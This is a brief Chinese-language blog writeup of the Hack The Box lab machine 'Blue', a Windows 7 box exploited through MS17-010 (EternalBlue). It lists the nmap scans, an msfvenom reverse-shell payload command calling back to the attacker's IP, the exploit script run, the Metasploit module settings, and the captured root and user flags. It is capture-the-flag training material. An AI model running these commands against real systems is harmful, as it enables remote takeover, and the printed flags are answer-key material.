---
title: Blue (Hack The Box Writeup)
date: 2021-09-15T13:41:00+08:00
draft: false
url: "/2021/09/15/blue-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/51
- IP : 10.129.209.90

## Recon

- Rustscan![](/uploads/2022/02/c5805-67XVo54.png)nmap- `nmap -A -p 135,139,445,49152,49153,49154,49155,49156,49157 10.129.209.90`![](/uploads/2022/02/ac899-KncNQzE.png)系統版本- Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)smb- ![](/uploads/2022/02/5d6a0-n93prMN.png)
- ![](/uploads/2022/02/c0d5e-B8ABEM7.png)
- ![](/uploads/2022/02/f2a4e-mZDgLa8.png)nmapAutomator- ![](/uploads/2022/02/ef2a6-UlMW8lp.png)

## Exploit

- https://github.com/helviojunior/MS17-010修改 `send_and_execute.py` 裡面的 username等於 `guest`MSF 準備 shell- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7877 -f exe -o shellx64.exe`其實這邊用 x86 也可以執行 Exploit- `python send_and_execute.py 10.129.216.62 ../shellx64.exe`
- ![](/uploads/2022/02/a4c94-bvmzbcP.png)nc 收 shell- ![](/uploads/2022/02/55341-QTfgtnr.png)

## MSF Exploit

- `use windows/smb/ms17_010_eternalblue`
- options![](/uploads/2022/02/24d97-yLfHcrh.png)
- `set RHOSTS 10.129.216.62`
- `set LHOST 10.10.16.35`
- `run`![](/uploads/2022/02/4adc0-MJjRbSk.png)Get Root Key- `ff548eb71e920ff6c08843ce9df4e717`
- ![](/uploads/2022/02/91e59-xJVAJs4.png)Get User Key- ![](/uploads/2022/02/6ef87-VEFkOCN.png)
- `4c546aea7dbee75cbd71de245c8deea9`
